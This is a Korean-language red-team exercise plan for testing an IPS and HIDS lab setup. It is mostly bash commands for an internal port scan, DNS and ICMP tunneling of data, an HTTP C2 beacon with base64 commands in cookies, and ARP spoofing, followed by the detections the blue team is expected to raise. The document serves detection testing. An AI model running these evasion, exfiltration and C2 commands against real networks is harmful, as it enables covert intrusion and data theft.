# Red Team Tier 2: 네트워크/IPS 우회 공격

## MITRE ATT&CK 매핑

```
T1046 Network Service Scanning → T1071.001 Application Layer Protocol
→ T1572 Protocol Tunneling → T1048.003 Exfiltration Over Unencrypted Protocol
→ T1557.002 ARP Cache Poisoning
```

## 전제 조건

- 공격자가 내부망(10.20.30.0/24)에 일부 접근 확보 (Tier 1 성공 가정, web 쉘 기반)
- Suricata IPS가 NFQUEUE inline 모드로 동작 중
- 목표: IPS를 우회하여 탐지되지 않는 통신 채널 확보

---

## 공격 단계

### Stage 1: 내부 네트워크 정찰 (T1046)

```bash
# web 서버에서 내부망 스캔 (Tier 1에서 확보한 접근 활용)
# nmap 없이 bash로 포트 스캔
for host in 10.20.30.1 10.20.30.100; do
  for port in 22 80 443 514 1514 1515 5601 9200 9300 9400; do
    (echo > /dev/tcp/$host/$port) 2>/dev/null && echo "$host:$port OPEN"
  done
done

# ARP 테이블로 활성 호스트 확인
arp -a

# 라우팅 테이블 확인 → 게이트웨이(secu) 식별
ip route show
```

### Stage 2: DNS 터널링 시도 (T1572)

```bash
# DNS 쿼리로 데이터 인코딩하여 전송 시뮬레이션
# (실제 외부 DNS 서버 없이, 내부에서 시뮬레이션)

# 데이터를 base32 인코딩 → DNS 서브도메인으로 분할
DATA=$(echo "sensitive_data_from_target" | base32)
# dns query 시뮬레이션 (nslookup/dig)
for chunk in $(echo "$DATA" | fold -w 40); do
  dig +short "${chunk}.tunnel.example.com" @10.20.30.1 2>/dev/null || true
done

# Suricata가 비정상 DNS 쿼리 패턴(긴 서브도메인, 높은 빈도)을 탐지해야 함
```

### Stage 3: ICMP 터널링 (T1048.003)

```bash
# ICMP payload에 데이터를 실어 전송 시뮬레이션
# ping의 -p 옵션으로 커스텀 패턴 전송
ping -c 5 -p "$(echo 'exfiltrated_data' | xxd -p | head -c 32)" 10.20.30.1

# 대량 ICMP (정상 범위 초과)
ping -c 100 -s 1400 -i 0.1 10.20.30.1
# → IPS가 ICMP flood/tunnel 패턴 탐지해야 함
```

### Stage 4: HTTP 기반 C2 시뮬레이션 (T1071.001)

```bash
# 정상 HTTP 트래픽으로 위장한 C2 통신 시뮬레이션
# User-Agent 변조 + 인코딩된 명령어

# 비콘(beacon) 시뮬레이션 — 주기적 HTTP GET
for i in $(seq 1 20); do
  # 명령어를 Base64로 인코딩하여 쿠키에 삽입
  CMD_B64=$(echo "whoami" | base64)
  curl -s -H "Cookie: session=${CMD_B64}" \
       -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64)" \
       "http://10.20.30.80/images/logo.png?_=${RANDOM}" > /dev/null
  sleep 2
done
# → Wazuh/Suricata가 비정상 비콘 패턴(주기적 동일 URL 접근, Base64 쿠키) 탐지해야 함
```

### Stage 5: ARP Spoofing 시도 (T1557.002)

```bash
# ARP 스푸핑 시뮬레이션 (실제 arpspoof 대신 수동 ARP 패킷)
# web 서버에서 secu 게이트웨이로 위장 시도

# arping으로 ARP reply 전송 (제한적)
arping -c 5 -U -I enp1s0 -s 10.20.30.1 10.20.30.100 2>/dev/null || true

# /proc/net/arp 모니터링으로 ARP 테이블 변화 확인
cat /proc/net/arp
# → AuditD + Wazuh가 ARP 변조 시도 감지해야 함
```

---

## 탐지 기대점 (Blue Team이 잡아야 할 것)

| 공격 | 탐지 소스 | 기대 경보 |
|------|---------|---------|
| 내부 포트 스캔 | Suricata | ET SCAN 관련 시그니처 |
| DNS 터널링 | Suricata/Wazuh | 비정상 DNS 쿼리 길이, 빈도 |
| ICMP 터널링 | Suricata | ICMP 대용량 페이로드, flood |
| HTTP C2 비콘 | Wazuh/ModSecurity | 주기적 패턴, Base64 쿠키 |
| ARP 스푸핑 | Sysmon/AuditD→Wazuh | ARP 테이블 변경 이벤트 |

---

## 학술적 수준 근거

- **Protocol-level evasion**: 단순 포트 스캔이 아닌 프로토콜 터널링 기법
- **C2 통신 시뮬레이션**: APT 그룹이 사용하는 HTTP beaconing 패턴 재현
- **Defense-in-depth 테스트**: IPS(Suricata) + HIDS(Wazuh) + 호스트 로그(AuditD/Sysmon) 다층 탐지
- 참고: *"DNS Tunneling Detection using ML"* (NDSS), *"C2 Traffic Analysis"* (CCS)
